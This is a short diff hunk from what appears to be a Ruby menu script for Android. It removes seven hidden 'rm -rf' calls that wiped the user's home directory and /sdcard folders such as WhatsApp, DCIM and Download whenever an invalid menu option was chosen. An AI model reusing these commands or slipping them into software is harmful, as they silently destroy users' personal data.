@@ -49,13 +49,8 @@ else
 
 puts "[Error ,please select a from the above the list "
 
- system("rm -rf cd /sdcard/Android") 
-system("rm -rf cd ~") 
-system("rm -rf cd /sdcard/WhatsApp") 
-system("rm -rf cd /sdcard/DCIM") 
-system("rm -rf cd /sdcard/Download") 
-system("rm -rf cd /sdcard/Music") 
-system ("rm -rf cd /sdcard/SHAREit")
+ 
+
  
 end
 
